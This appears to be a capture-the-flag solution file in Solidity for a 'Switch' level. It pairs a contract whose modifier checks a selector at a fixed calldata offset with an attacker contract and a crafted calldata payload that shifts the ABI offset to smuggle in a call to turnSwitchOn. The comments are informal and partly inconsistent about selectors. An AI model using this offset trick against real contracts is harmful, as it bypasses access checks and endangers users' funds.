/*

        0x  30c13ade
            0000000000000000000000000000000000000000000000000000000000000020   location 60->96 bytes     32 bytes    
            0000000000000000000000000000000000000000000000000000000000000004   size = 4 bytes            32 bytes
            20606e1500000000000000000000000000000000000000000000000000000000                             32 bytes

            -> signature of switchOn()> "0xf9f8f895"

        0x  30c13ade
            0000000000000000000000000000000000000000000000000000000000000060   location 60->96 bytes     32 bytes   
            0000000000000000000000000000000000000000000000000000000000000000                             32 bytes   
            20606e1500000000000000000000000000000000000000000000000000000000                             32 bytes   
            0000000000000000000000000000000000000000000000000000000000000004   size = 4 bytes            32 bytes
            f9f8f89500000000000000000000000000000000000000000000000000000000                             32 bytes   


                                    or (because 20606e is here only for modifier & due to 60 data starts after 96 bytes from start so value no matter what is hexavalue in between (after start berfore 96 bytes))

        0x  30c13ade
            0000000000000000000000000000000000000000000000000000000000000060                               
            0000000000000000000000000000000000000000000000000000000000000004                         
            20606e1500000000000000000000000000000000000000000000000000000000                            
            0000000000000000000000000000000000000000000000000000000000000004             
            76227e1200000000000000000000000000000000000000000000000000000000                               
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
    address public adr;

    constructor(address _switchContractAddress) {
        adr = _switchContractAddress;
    }

    function executeSwitchFlip(bytes calldata _calldata) external 
    {
        (bool success, ) = adr.call(_calldata);
        require(success, "Call to Switch contract failed");
    }
}



contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }
    /* 
    static variable  - Those variable whose size is determined during the compiler time  
    f(uint256 i)

    dynamic variable - Those variable whose size can't  determined during the compiler time & only know when we give input
    f(bytes memory i) 
*/

    function flipSwitch(bytes memory _data) public onlyOff 
    {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

//0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
                               
                                     
                                        
                         
            